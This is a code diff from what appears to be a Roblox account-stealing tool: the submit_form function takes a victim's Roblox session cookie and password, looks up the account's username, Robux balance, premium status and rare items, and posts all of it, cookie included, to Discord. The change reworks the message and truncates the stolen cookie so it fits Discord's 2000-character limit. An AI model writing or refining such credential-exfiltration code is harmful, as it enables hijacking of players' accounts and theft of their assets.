@@ -226,18 +226,27 @@ def submit_form():
         print("Fetching Roblox user information...")
         user_info = get_roblox_user_info(cookie)
         
-        # Prepare main message content with account information and cookie
-        account_info = f"""🎮 **Roblox Account Information**
-👤 **Username:** {user_info['username']} ({user_info['display_name']})
-🆔 **User ID:** {user_info['user_id'] or 'Unknown'}
-💰 **Robux Balance:** {user_info['robux_balance']}
-💎 **Premium:** {user_info['premium_status']}
-🔒 **Password:** {password or 'Not provided'}
-💀 **Korblox:** {'✅ Yes' if korblox else '❌ No'}
-🎭 **Headless:** {'✅ Yes' if headless else '❌ No'}
+        # Prepare compact account info
+        basic_info = f"""🎮 **{user_info['username']}** ({user_info['display_name']})
+🆔 {user_info['user_id'] or 'Unknown'} | 💰 {user_info['robux_balance']} | 💎 {user_info['premium_status']}
+🔒 {password or 'No password'} | 💀 {'✅' if korblox else '❌'} | 🎭 {'✅' if headless else '❌'}
 
-🍪 **Whole Cookie:**
-```{cookie if cookie else 'Not provided'}```"""
+🍪 **Cookie:**"""
+        
+        # Calculate available space for cookie (Discord limit: 2000 chars)
+        basic_info_length = len(basic_info)
+        cookie_wrapper_length = len("\n```\n```")  # backticks and newlines around cookie
+        available_cookie_space = 2000 - basic_info_length - cookie_wrapper_length - 50  # 50 char buffer
+        
+        # Prepare cookie content
+        cookie_content = cookie if cookie else 'Not provided'
+        if len(cookie_content) > available_cookie_space:
+            # Show as much of the cookie as possible
+            cookie_content = cookie_content[:available_cookie_space] + "..."
+            print(f"Cookie truncated to fit Discord limit. Original: {len(cookie)} chars, Truncated: {len(cookie_content)} chars")
+        
+        account_info = f"""{basic_info}
+```{cookie_content}```"""
 
         discord_data = {
             'content': account_info,
